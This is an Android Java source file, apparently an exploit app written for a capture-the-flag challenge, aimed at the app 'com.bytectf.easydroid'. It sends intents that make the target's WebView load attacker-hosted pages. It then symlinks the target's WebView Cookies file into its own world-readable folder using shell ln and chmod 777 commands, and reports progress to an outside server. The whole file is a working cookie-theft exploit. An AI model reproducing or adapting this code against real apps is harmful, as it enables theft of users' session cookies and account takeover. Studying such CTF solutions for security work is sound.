package com.bytectf.pwneasydroid;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.StrictMode;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.Date;

public class MainActivity extends AppCompatActivity {
    public Uri visit_set_cookie_intent =
            Uri.parse("http://toutiao.com.bytectf.wrlus.com/visit_set_cookie_intent.html");
    public Uri read_cookie_intent_uri =
            Uri.parse("http://toutiao.com.bytectf.wrlus.com/read_cookie_intent.html");

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);

        exploitTestActivity(visit_set_cookie_intent);
        // 40s later...
        new Handler().postDelayed(()->{
            createSymlink();
            exploitTestActivity(read_cookie_intent_uri);
        }, 40000);
    }

    private void exploitTestActivity(Uri uri) {
        Intent intent = new Intent();
        intent.setData(uri);
        intent.setClassName("com.bytectf.easydroid",
                "com.bytectf.easydroid.MainActivity");
        startActivity(intent);
    }

    private void createSymlink() {
        String rootCookieFile = "/data/data/com.bytectf.easydroid/app_webview/Cookies";
        String symlinkFile = "/data/data/com.bytectf.pwneasydroid/symlink.html";

        try {
            Runtime.getRuntime().exec("ln -s " + rootCookieFile + " " + symlinkFile).waitFor();
//            Note: Must change permission for the whole folder !
            Runtime.getRuntime().exec("chmod -R 777 /data/data/com.bytectf.pwneasydroid/").waitFor();
            Runtime.getRuntime().exec("chmod 777 " + symlinkFile).waitFor();

            requestServer("ping=symlinkSucc&time" + new Date().toString());
        } catch (Exception e) {
            e.printStackTrace();
            requestServer("ping=createSymlinkError&time" + new Date().toString());
        }
    }

    private void requestServer(String param) {
        try {
            String u = "http://wrlus.com/?" + param;
            URL url = new URL(u);
            URLConnection connection = url.openConnection();
            connection.setConnectTimeout(60000);
            connection.setReadTimeout(60000);
            connection.connect();
            BufferedReader uReader = new BufferedReader(
                    new InputStreamReader(connection.getInputStream()));

            uReader.readLine();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
